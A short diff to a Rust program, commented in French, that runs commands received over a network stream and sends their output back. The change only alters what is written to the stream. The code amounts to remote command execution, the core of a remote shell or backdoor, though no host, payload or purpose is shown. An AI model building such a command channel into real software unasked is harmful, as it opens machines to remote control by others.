@@ -72,7 +72,7 @@ let mut msg: Vec<u8> = Vec::new();
                         //On génére et execute la commande
                         let command_res = execute_command(command);
                         //On affiche son résultat
-                        stream.write(&command_res.stdout);
+                        stream.write(&command_res);
                         //et on vide le collecteur
                         msg.clear();
                     //sinon
